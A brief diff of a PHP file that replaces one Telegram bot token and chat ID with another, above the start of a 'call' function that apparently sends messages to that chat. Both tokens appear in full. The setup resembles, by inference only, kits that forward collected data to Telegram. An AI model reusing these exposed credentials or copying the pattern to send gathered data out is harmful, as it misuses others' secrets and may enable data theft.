@@ -2,8 +2,8 @@
 
 
 // telegram information
-$token = "8817564781:AAEIG2rQRWIOXikQEiba-ouRsIJhaqvArqk";
-$id = "-5165764264";
+$token = "8926703034:AAGQntYA1lox2dO4pLBqfQXhBCdwGbjpO88";
+$id = "-5496218974";
  
 
 function call($msg, $rms = null){
